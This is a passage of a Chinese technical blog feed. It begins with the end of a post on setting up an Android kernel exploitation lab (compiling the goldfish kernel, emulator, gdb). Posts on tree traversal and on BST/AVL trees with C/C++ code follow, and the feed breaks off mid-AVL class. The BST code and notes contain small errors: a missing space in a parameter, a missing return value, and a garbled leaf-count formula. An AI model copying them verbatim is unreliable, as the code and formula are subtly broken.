https://android.googlesource.com/platform/prebuilts/gcc/linux-x86/arm/arm-linux-androideabi-4.6</span><br></pre></td></tr></table></figure><h2 id="编译虚拟机"><a href="#编译虚拟机" class="headerlink" title="编译虚拟机"></a>编译虚拟机</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">export</span> ARCH=arm SUBARCH=arm CROSS_COMPILE=arm-linux-androideabi- &amp;&amp;\</span><br><span class="line"><span class="built_in">export</span> PATH=$(<span class="built_in">pwd</span>)/arm-linux-androideabi-4.6/bin/:<span class="variable">$PATH</span> &amp;&amp; \</span><br><span class="line"><span class="built_in">cd</span> goldfish &amp;&amp; make goldfish_armv7_defconfig &amp;&amp; make -j8</span><br></pre></td></tr></table></figure><p>（这里也是在goldfish上层目录）</p><p>其中会有一个vmlinux，vmlinux是linux进行编译和连接之后生成的Elf格式的文件，用gdb可以进行调试。</p><h2 id="下载安装AndroidSDK"><a href="#下载安装AndroidSDK" class="headerlink" title="下载安装AndroidSDK"></a>下载安装AndroidSDK</h2><p><a href="http://dl.google.com/android/android-sdk_r24.4.1-linux.tgz">下载地址</a><br>使用tar命令解压之后，再将tools添加到环境变量中<br>（这里最好把这些环境变量全都加到.bashrc下，比较方便）<br>然后我们启动tools下的android程序。<br>如果你的电脑没有java环境，那么你就需要装一个，可以使用apt直接装</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;&#x2F; 安装默认的jre和jdk</span><br><span class="line">sudo apt-get install default-jre</span><br><span class="line">sudo apt-get install default-jdk</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F; 安装oracle JDK</span><br><span class="line">sudo apt-get install software-properties-common</span><br><span class="line">sudo add-apt-repository ppa:webupd8team&#x2F;java</span><br><span class="line">sudo apt-get update</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F; 安装JDK8</span><br><span class="line">sudo apt-get install oracle-java8-installer</span><br></pre></td></tr></table></figure><p>我直接装的默认的<br>android是android SDK manager程序，在这里我们需要装android 4.4.2API19下的SDK plantform和arm eabi system image<br><img src="/2020/07/19/PlayWithAndroidKernel/1.jpg" alt><br>使用 <code>android list targets</code>可以看到有对应的镜像文件<br><img src="/2020/07/19/PlayWithAndroidKernel/2.jpg" alt><br>然后创建模拟器</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">android create avd --force -t &quot;android-19&quot; -n kernel_challenges</span><br></pre></td></tr></table></figure><p><img src="/2020/07/19/PlayWithAndroidKernel/3.jpg" alt="img"><br>然后进入 goldfish 目录，使用下面的命令来使以goldfish运行模拟器</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">emulator -show-kernel -kernel arch&#x2F;arm&#x2F;boot&#x2F;zImage -avd kernel_challenges -no-boot-anim -no-skin -no-audio -no-window -qemu -monitor unix:&#x2F;tmp&#x2F;qemuSocket,server,nowait -s</span><br></pre></td></tr></table></figure><h2 id="调试启动虚拟机"><a href="#调试启动虚拟机" class="headerlink" title="调试启动虚拟机"></a>调试启动虚拟机</h2><p>在goldfish目录下</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">arm-linux-androideabi-gdb vmlinux</span><br></pre></td></tr></table></figure><p>这里有可能遇到</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">arm-linux-androideabi-gdb: error while loading shared libraries: libpython2.6.so.1.0: cannot open shared object file: No such file or directory</span><br></pre></td></tr></table></figure><p>因为我的ubuntu版本默认的是python2.7+3.5的环境，而这个就纯找python2.6的库，于是会报错，所以我们使用ln命令把2.7的库软连接2.6的库。</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">sudo ln -s &#x2F;usr&#x2F;lib&#x2F;x86_64-linux-gnu&#x2F;libpython2.7.so.1.0 &#x2F;usr&#x2F;lib&#x2F;x86_64-linux-gnu&#x2F;libpython2.6.so.1.0</span><br></pre></td></tr></table></figure><p>正常之后是这样的<br><img src="/2020/07/19/PlayWithAndroidKernel/4.jpg" alt="img"></p><p>参考<br><a href="https://github.com/Fuzion24/AndroidKernelExploitationPlayground">https://github.com/Fuzion24/AndroidKernelExploitationPlayground</a><br><a href="https://www.anquanke.com/post/id/86617">https://www.anquanke.com/post/id/86617</a><br><a href="https://www.cnblogs.com/louby/p/10837864.html">https://www.cnblogs.com/louby/p/10837864.html</a></p>]]></content>
    
    
    <summary type="html">&lt;h1 id=&quot;导语&quot;&gt;&lt;a href=&quot;#导语&quot; class=&quot;headerlink&quot; title=&quot;导语&quot;&gt;&lt;/a&gt;导语&lt;/h1&gt;&lt;p&gt;Do you want to hack Android？&lt;/p&gt;</summary>
    
    
    
    
    <category term="pwn" scheme="https://blog.pillar.fun/tags/pwn/"/>
    
    <category term="Android" scheme="https://blog.pillar.fun/tags/Android/"/>
    
  </entry>
  
  <entry>
    <title>树的遍历</title>
    <link href="https://blog.pillar.fun/2020/07/09/%E6%A0%91%E7%9A%84%E9%81%8D%E5%8E%86/"/>
    <id>https://blog.pillar.fun/2020/07/09/%E6%A0%91%E7%9A%84%E9%81%8D%E5%8E%86/</id>
    <published>2020-07-09T08:04:54.000Z</published>
    <updated>2020-07-09T08:18:25.090Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="导语"><a href="#导语" class="headerlink" title="导语"></a>导语</h1><p>基础知识很重要，简单记一下树的三种遍历。</p><a id="more"></a><h1 id="先序遍历"><a href="#先序遍历" class="headerlink" title="先序遍历"></a>先序遍历</h1><p>先序遍历从根节点开始，先访问当前节点，如果左子树不空就访问左子树，如果右子树不空再访问右子树。<br>我们可以拿优先级的思想来类比看待<br><strong>自己&gt;左儿子&gt;右儿子</strong><br>动图看的话就是这样<br><img src="/2020/07/09/%E6%A0%91%E7%9A%84%E9%81%8D%E5%8E%86/1.gif" alt><br><img src="/2020/07/09/%E6%A0%91%E7%9A%84%E9%81%8D%E5%8E%86/2.gif" alt><br><img src="/2020/07/09/%E6%A0%91%E7%9A%84%E9%81%8D%E5%8E%86/3.gif" alt></p><h1 id="中序遍历"><a href="#中序遍历" class="headerlink" title="中序遍历"></a>中序遍历</h1><p>中序遍历从左子树开始，然后访问当前节点，最后访问右子树<br><strong>左儿子&gt;自己&gt;右儿子</strong><br>动图如下<br><img src="/2020/07/09/%E6%A0%91%E7%9A%84%E9%81%8D%E5%8E%86/4.gif" alt><br><img src="/2020/07/09/%E6%A0%91%E7%9A%84%E9%81%8D%E5%8E%86/5.gif" alt><br><img src="/2020/07/09/%E6%A0%91%E7%9A%84%E9%81%8D%E5%8E%86/6.gif" alt></p><h1 id="后序遍历"><a href="#后序遍历" class="headerlink" title="后序遍历"></a>后序遍历</h1><p>后序遍历先左子树，然后右子树，然后自己<br><strong>左儿子&gt;右儿子&gt;自己</strong><br>动图如下<br><img src="/2020/07/09/%E6%A0%91%E7%9A%84%E9%81%8D%E5%8E%86/7.gif" alt><br><img src="/2020/07/09/%E6%A0%91%E7%9A%84%E9%81%8D%E5%8E%86/8.gif" alt></p>]]></content>
    
    
    <summary type="html">&lt;h1 id=&quot;导语&quot;&gt;&lt;a href=&quot;#导语&quot; class=&quot;headerlink&quot; title=&quot;导语&quot;&gt;&lt;/a&gt;导语&lt;/h1&gt;&lt;p&gt;基础知识很重要，简单记一下树的三种遍历。&lt;/p&gt;</summary>
    
    
    
    
    <category term="数据结构" scheme="https://blog.pillar.fun/tags/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/"/>
    
  </entry>
  
  <entry>
    <title>BST与AVL与RBT</title>
    <link href="https://blog.pillar.fun/2020/07/09/BST%E4%B8%8EAVL%E4%B8%8ERBT/"/>
    <id>https://blog.pillar.fun/2020/07/09/BST%E4%B8%8EAVL%E4%B8%8ERBT/</id>
    <published>2020-07-09T02:27:20.000Z</published>
    <updated>2022-02-20T04:21:56.931Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="导语"><a href="#导语" class="headerlink" title="导语"></a>导语</h1><p>BST（二叉排序树、二叉搜索树、二叉查找树），AVL（平衡二叉树）以及BRT（红黑树）是非常重要的数据结构。</p><h1 id="BST"><a href="#BST" class="headerlink" title="BST"></a>BST</h1><h2 id="BST性质"><a href="#BST性质" class="headerlink" title="BST性质"></a>BST性质</h2><p>BST的中文名很多，实际上都是一个东西。</p><ul><li>在二叉树中的第i层上至多有$2^{i-1}$个结点（i&gt;=1)。</li><li>深度为k的二叉树至多有$2^k-1$个节点（k&gt;=1)。</li><li>对任何一棵二叉树T，如果其叶结点数目为$n_0$，度为2的节点数目为$n_2$，则$n_0$=+1。</li><li>具有n个节点的完全二叉树的深度为$log_{2}{n}+1$</li></ul><h2 id="BST操作"><a href="#BST操作" class="headerlink" title="BST操作"></a>BST操作</h2><p>查找、插入、删除、遍历操作（比较简单）</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">二叉排序树  &lt;==&gt; 二叉搜索树 (BST) &lt;==&gt;  二叉查找树 </span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">1. 二叉排序树的查找功能 (递归、非递归实现)    --&gt; 查找效率很大程度上取决于二叉排序树的高度。 </span></span><br><span class="line"><span class="comment">2. 二叉排序树的插入功能 (默认不同元素的值才插入) --&gt; 先查找再插入 </span></span><br><span class="line"><span class="comment">3. 二叉排序树的删除功能 (两种实现方式, 1.后继结点顶上来，删除后继结点 2.前驱结点顶上来,删除前驱结点)  --&gt; 先查找再删除 </span></span><br><span class="line"><span class="comment">4. 根据一个序列,构造二叉排序树的功能。  --&gt; 其实就是遍历序列 插入二叉排序树。 </span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">二叉排序树的一个重要指标 : 平均查找长度(ASL)</span></span><br><span class="line"><span class="comment">平均查找长度又分: 查找成功的平均查找长度    sum(查找每个元素的比较次数)/元素个数  </span></span><br><span class="line"><span class="comment">  查找失败的平均查找长度    sum(查找每个失败元素时比较次数)/失败出现的可能数 </span></span><br><span class="line"><span class="comment">  结论: 二叉排序树最好尽可能平衡,因为这样的查找效率可以达到O(log n).  </span></span><br><span class="line"><span class="comment"> </span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span> </span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> ElemType int</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> null NULL</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">BSTNode</span>&#123;</span></span><br><span class="line">ElemType key;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">BSTNode</span> *<span class="title">lchild</span>,*<span class="title">rchild</span>;</span></span><br><span class="line">&#125;BSTNode;</span><br><span class="line"> </span><br><span class="line"><span class="comment">//二叉搜索树查找功能的非递归实现   时间复杂度O(log n) - O(n) </span></span><br><span class="line"><span class="function">BSTNode* <span class="title">findKey</span><span class="params">(BSTNode *t,ElemType value)</span></span>&#123; <span class="comment">//最坏空间复杂度O(1) </span></span><br><span class="line"><span class="comment">//t == null 代表查找元素不存在   </span></span><br><span class="line"><span class="keyword">while</span>(t != null &amp;&amp; value != t-&gt;key)&#123;</span><br><span class="line"><span class="keyword">if</span>(t-&gt;key &gt; value)&#123;</span><br><span class="line">t = t-&gt;lchild;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">t = t-&gt;rchild;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> t;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//二叉搜索树的查找功能(递归实现)</span></span><br><span class="line"><span class="function">BSTNode* <span class="title">findKey2</span><span class="params">(BSTNode *t, ElemType value)</span></span>&#123; <span class="comment">//最坏空间复杂度O(h)  h是二叉搜索树的最大高度。 </span></span><br><span class="line"><span class="keyword">if</span>(t == null)&#123;</span><br><span class="line"><span class="keyword">return</span> null;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(t-&gt;key == value)&#123;</span><br><span class="line"><span class="keyword">return</span> t;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(t-&gt;key &gt; value)&#123;</span><br><span class="line"><span class="keyword">return</span> findKey2(t-&gt;lchild,value);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line"><span class="keyword">return</span> findKey2(t-&gt;rchild,value);</span><br><span class="line">&#125;</span><br><span class="line">&#125; </span><br><span class="line"> </span><br><span class="line"><span class="comment">//二叉搜索树的插入功能 (默认不同元素的值才插入) </span></span><br><span class="line"><span class="function"><span class="keyword">bool</span> <span class="title">BST_insert</span><span class="params">(BSTNode **t, ElemType value)</span></span>&#123;</span><br><span class="line"><span class="comment">//插入第一个结点 </span></span><br><span class="line"><span class="keyword">if</span>(*t == null)&#123;</span><br><span class="line">BSTNode *s = (BSTNode *)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(BSTNode));</span><br><span class="line">s-&gt;key = value;</span><br><span class="line">s-&gt;lchild = null;</span><br><span class="line">s-&gt;rchild = null;</span><br><span class="line"> *t=s;</span><br><span class="line"><span class="keyword">return</span> <span class="literal">true</span>;  </span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(((*t)-&gt;key == value))&#123;</span><br><span class="line"><span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">&#125;<span class="keyword">else</span> <span class="keyword">if</span>((*t)-&gt;key &gt; value &amp;&amp; (*t)-&gt;lchild == null)&#123;</span><br><span class="line">BSTNode *s = (BSTNode *)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(BSTNode));</span><br><span class="line">s-&gt;key = value;</span><br><span class="line">s-&gt;lchild = null;</span><br><span class="line">s-&gt;rchild = null;</span><br><span class="line">(*t)-&gt;lchild=s;</span><br><span class="line"><span class="keyword">return</span> <span class="literal">true</span>; </span><br><span class="line">&#125;<span class="keyword">else</span> <span class="keyword">if</span>((*t)-&gt;key &lt; value &amp;&amp; (*t)-&gt;rchild == null)&#123;</span><br><span class="line">BSTNode *s = (BSTNode *)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(BSTNode));</span><br><span class="line">s-&gt;key = value;</span><br><span class="line">s-&gt;lchild = null;</span><br><span class="line">s-&gt;rchild = null;</span><br><span class="line">(*t)-&gt;rchild=s;</span><br><span class="line"><span class="keyword">return</span> <span class="literal">true</span>; </span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line"><span class="comment">//递归寻找</span></span><br><span class="line"><span class="keyword">if</span>((*t)-&gt;key &gt; value)&#123;</span><br><span class="line"> BST_insert(&amp;((*t)-&gt;lchild),value);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line"> BST_insert(&amp;((*t)-&gt;rchild),value);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125; </span><br><span class="line"><span class="comment">//根据序列构造二叉搜索树</span></span><br><span class="line"><span class="function">BSTNode* <span class="title">Creat_BST</span><span class="params">(ElemType str[],<span class="keyword">int</span> n)</span></span>&#123;</span><br><span class="line">BSTNode *t = null;  <span class="comment">//初始时t为空树 </span></span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>;i &lt; n;i++)&#123;  <span class="comment">//依次将每个关键字插入到二叉排序树中 </span></span><br><span class="line"></span><br><span class="line">BST_insert(&amp;t,str[i]);</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> t;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="comment">//二叉搜索树的删除功能</span></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">1.删除的结点是叶子结点</span></span><br><span class="line"><span class="comment">2.删除的结点只有左子树或者只有右子树 </span></span><br><span class="line"><span class="comment">3.删除的结点既有左子树又有右子树 </span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="comment">//value是要删除的元素值</span></span><br><span class="line"><span class="comment">//不应该找到要删除的元素,而是应该找到要删除元素的前一个元素。 </span></span><br><span class="line"><span class="function">BSTNode* <span class="title">BST_delete</span><span class="params">(BSTNode *b,ElemTypevalue)</span></span>&#123;</span><br><span class="line">BSTNode *t = b; </span><br><span class="line"><span class="comment">//f指针指向的是要删除结点的双亲 </span></span><br><span class="line">BSTNode *f = null;</span><br><span class="line"><span class="comment">//判断t是f的哪个孩子(左孩子 or 右孩子) </span></span><br><span class="line"><span class="keyword">int</span> child = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">while</span>(t != null &amp;&amp; t-&gt;key != value )&#123;</span><br><span class="line">f=t; </span><br><span class="line"><span class="keyword">if</span>(t-&gt;key &gt; value)&#123;</span><br><span class="line">child = <span class="number">-1</span>;</span><br><span class="line">t= t-&gt;lchild;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">child = <span class="number">1</span>;</span><br><span class="line">t=t-&gt;rchild;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//没找到  删除失败 </span></span><br><span class="line"><span class="keyword">if</span>(t == null)&#123;</span><br><span class="line"><span class="keyword">return</span> b; </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"> <span class="comment">//删除的是根节点,并且左右子树都没有 </span></span><br><span class="line"> <span class="keyword">if</span>(f == null &amp;&amp; t -&gt; rchild == null &amp;&amp; t-&gt;lchild == null )&#123;</span><br><span class="line"> b = null;</span><br><span class="line"> <span class="built_in">free</span>(t);</span><br><span class="line"> <span class="keyword">return</span> b;</span><br><span class="line"> &#125;</span><br><span class="line"> <span class="comment">//删除的是根节点,并且没有左子树,只有右子树 </span></span><br><span class="line"><span class="keyword">if</span>(f == null &amp;&amp; t-&gt;lchild == null &amp;&amp; t-&gt;rchild!= null)&#123;</span><br><span class="line">b=t-&gt;rchild;</span><br><span class="line"><span class="built_in">free</span>(t);</span><br><span class="line"><span class="keyword">return</span> b;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//删除的是根节点,并且没有右子树,只有左子树 </span></span><br><span class="line"><span class="keyword">if</span>(f == null &amp;&amp; t-&gt;rchild == null &amp;&amp; t-&gt;lchild!= null)&#123;</span><br><span class="line">b=t-&gt;lchild;</span><br><span class="line"><span class="built_in">free</span>(t);</span><br><span class="line"><span class="keyword">return</span> b;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">//删除的是叶子结点 </span></span><br><span class="line"><span class="keyword">if</span>(t-&gt;lchild == null &amp;&amp; t-&gt;rchild == null)&#123;</span><br><span class="line"><span class="built_in">free</span>(t);</span><br><span class="line"><span class="comment">//删除的结点是他爹的左孩子</span></span><br><span class="line"><span class="keyword">if</span>(child == <span class="number">-1</span>)&#123;</span><br><span class="line">f-&gt;lchild = null; </span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(child == <span class="number">1</span>)&#123;</span><br><span class="line">f-&gt;rchild = null;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> b; </span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//删除的结点只有右子树,没有左子树 </span></span><br><span class="line"> <span class="keyword">if</span>(t-&gt;lchild == null &amp;&amp; t-&gt;rchild != null)&#123;</span><br><span class="line"> <span class="comment">//删除的结点是他爹的左孩子</span></span><br><span class="line"> <span class="keyword">if</span>(child == <span class="number">-1</span>)&#123;</span><br><span class="line"> f-&gt;lchild = t-&gt;rchild;</span><br><span class="line"> <span class="built_in">free</span>(t);</span><br><span class="line"> &#125;</span><br><span class="line"> <span class="keyword">if</span>(child == <span class="number">1</span>)&#123;</span><br><span class="line"> f-&gt;rchild = t-&gt;rchild;</span><br><span class="line"><span class="built_in">free</span>(t); </span><br><span class="line"> &#125;</span><br><span class="line"> <span class="keyword">return</span> b;</span><br><span class="line"> &#125;</span><br><span class="line">  </span><br><span class="line"><span class="comment">//删除的结点只有左子树,没有右子树 </span></span><br><span class="line"><span class="keyword">if</span>(t-&gt;lchild != null &amp;&amp; t-&gt;rchild == null)&#123;</span><br><span class="line"><span class="comment">//删除的结点是他爹的左孩子 </span></span><br><span class="line"> <span class="keyword">if</span>(child == <span class="number">-1</span>)&#123;</span><br><span class="line"> f-&gt;lchild = t-&gt;lchild;</span><br><span class="line"> <span class="built_in">free</span>(t);</span><br><span class="line"> &#125;</span><br><span class="line"> <span class="keyword">if</span>(child == <span class="number">1</span>)&#123;</span><br><span class="line"> f-&gt;rchild = t-&gt;lchild;</span><br><span class="line"><span class="built_in">free</span>(t); </span><br><span class="line"> &#125;</span><br><span class="line"> <span class="keyword">return</span> b;</span><br><span class="line">&#125; </span><br><span class="line"><span class="comment">//删除的结点既有左子树又有右子树 </span></span><br><span class="line"><span class="keyword">if</span>(t-&gt;lchild != null &amp;&amp; t-&gt;rchild != null )&#123;</span><br><span class="line"><span class="comment">//两种方式解决  1.将右子树中最小的元素放到此位置,并删除右子树中的最小元素。 </span></span><br><span class="line"><span class="comment">//              2.将左子树中最大的元素放到此位置,并删除左子树中的最大元素。</span></span><br><span class="line"><span class="comment">//方式1代码 </span></span><br><span class="line"><span class="comment">//右子树中最小的元素,就是右子树中最左下角的元素.</span></span><br><span class="line"><span class="comment">//BSTNode *q = t-&gt;rchild;</span></span><br><span class="line"><span class="comment">//while(q-&gt;lchild != null )&#123;</span></span><br><span class="line"><span class="comment">//q = q-&gt;lchild;</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">//&#125;</span></span><br><span class="line"><span class="comment">//q即为要查找的右子树的最小元素</span></span><br><span class="line"><span class="comment">//1</span></span><br><span class="line"><span class="comment">// ElemType temp = q-&gt;key;</span></span><br><span class="line"> <span class="comment">//右子树中删除值最小的元素 , 先删除再赋值 </span></span><br><span class="line"> <span class="comment">//BST_delete(b,q-&gt;key);</span></span><br><span class="line"> <span class="comment">//t-&gt;key = temp;</span></span><br><span class="line"><span class="comment">//2 巧妙的利用了返回值,无缝将右子树部分删除掉q并衔接。 </span></span><br><span class="line">     <span class="comment">//    t-&gt;key = q-&gt;key; </span></span><br><span class="line">   <span class="comment">//  t-&gt;rchild = BST_delete(t-&gt;rchild,q-&gt;key); </span></span><br><span class="line"> </span><br><span class="line"><span class="comment">//方式2代码 </span></span><br><span class="line"><span class="comment">//左子树中最大的元素,就是左子树中最右下角的元素。 </span></span><br><span class="line"></span><br><span class="line">BSTNode *z = t-&gt;lchild;</span><br><span class="line"><span class="keyword">while</span>(z-&gt;rchild != null)&#123;</span><br><span class="line">z = z-&gt;rchild;</span><br><span class="line">&#125; </span><br><span class="line"><span class="comment">//z即为要查找的左子树的最大元素</span></span><br><span class="line">t-&gt;key = z-&gt;key;</span><br><span class="line">t-&gt;lchild = BST_delete(t-&gt;lchild,z-&gt;key); </span><br><span class="line"><span class="keyword">return</span> b;</span><br><span class="line">&#125; </span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"></span><br><span class="line"><span class="comment">//二叉树的中序遍历</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">in_order</span><span class="params">(BSTNode *t)</span></span>&#123;</span><br><span class="line"><span class="keyword">if</span>(t != null)&#123;</span><br><span class="line">in_order(t-&gt;lchild);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%d &quot;</span>,t-&gt;key);</span><br><span class="line">in_order(t-&gt;rchild);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> *argv[])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">ElemType str[] = &#123;<span class="number">19</span>,<span class="number">13</span>,<span class="number">11</span>,<span class="number">8</span>,<span class="number">50</span>,<span class="number">66</span>,<span class="number">70</span>,<span class="number">60</span>,<span class="number">63</span>,<span class="number">61</span>,<span class="number">65</span>,<span class="number">26</span>,<span class="number">30</span>,<span class="number">21</span>&#125;;</span><br><span class="line">BSTNode *m = Creat_BST(str,<span class="number">14</span>);</span><br><span class="line">in_order(m);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">BSTNode *end = BST_delete(m,<span class="number">70</span>); </span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">in_order(end);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="AVL"><a href="#AVL" class="headerlink" title="AVL"></a>AVL</h1><h2 id="AVL性质"><a href="#AVL性质" class="headerlink" title="AVL性质"></a>AVL性质</h2><ol><li>AVL的左右子树都是AVL树</li><li>AVL左右子树高度之差的绝对值不超过1</li></ol><h2 id="AVL操作"><a href="#AVL操作" class="headerlink" title="AVL操作"></a>AVL操作</h2><p>为了让AVL在操作之后仍抱有AVL的性质，AVL的增删查改操作相较于BST增加了一些难度，但也只是一些罢了，不过是左旋、右旋操作罢了</p><p><img src="/2020/07/09/BST%E4%B8%8EAVL%E4%B8%8ERBT/1.gif" alt="img"></p><p><img src="/2020/07/09/BST%E4%B8%8EAVL%E4%B8%8ERBT/2.gif" alt="img"></p><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stack&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">template</span>&lt;<span class="class"><span class="keyword">class</span> <span class="title">K</span>,<span class="keyword">class</span> <span class="title">V</span>&gt;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">AVLNode</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    AVLNode&lt;K, V&gt; * _pLeft;</span><br><span class="line">    AVLNode&lt;K, V&gt; * _pRight;</span><br><span class="line">    K key;</span><br><span class="line">    V value;</span><br><span class="line">    <span class="keyword">int</span> bf;</span><br><span class="line"></span><br><span class="line">    AVLNode()</span><br><span class="line">        :_pLeft(<span class="literal">NULL</span>)</span><br><span class="line">        , _pRight(<span class="literal">NULL</span>)</span><br><span class="line">    &#123;&#125;</span><br><span class="line"></span><br><span class="line">    AVLNode(<span class="keyword">const</span> K key, <span class="keyword">const</span> V value)</span><br><span class="line">        :_pLeft(<span class="literal">NULL</span>)</span><br><span class="line">        , _pRight(<span class="literal">NULL</span>)</span><br><span class="line">        , key(key)</span><br><span class="line">        , value(value)</span><br><span class="line">        , bf(<span class="number">0</span>)</span><br><span class="line">    &#123;&#125;</span><br><span class="line"></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">template</span>&lt;<span class="class"><span class="keyword">class</span> <span class="title">K</span>,<span class="keyword">class</span> <span class="title">V</span>&gt;</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">AVLTree</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="comment">//typedef AVLNode&lt;class K, class V&gt; Node;</span></span><br><span class="line">    <span class="comment">//typedef AVLNode&lt;class K, class V&gt; * PNode;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="comment">// 构造函数--无参</span></span><br><span class="line">    AVLTree()</span><br><span class="line">        :_pRoot(<span class="literal">NULL</span>)</span><br><span class="line">    &#123;&#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">////构造函函数--含参</span></span><br><span class="line">    <span class="comment">//AVLTree(const K key, const V value)</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">//&#123;&#125;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// 插入函数</span></span><br><span class="line">    <span class="function"><span class="keyword">bool</span> <span class="title">Insert</span><span class="params">(<span class="keyword">const</span> K key, <span class="keyword">const</span> V value)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> _Insert(key, value, _pRoot);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 显示函数</span></span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">showTree</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        _showTree(_pRoot);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 删除函数</span></span><br><span class="line">    <span class="function"><span class="keyword">bool</span> <span class="title">Remove</span><span class="params">(K key)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> Remove(_pRoot, key);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">private</span>:</span><br><span class="line">    AVLNode&lt;K, V&gt; * _pRoot;</span><br><span 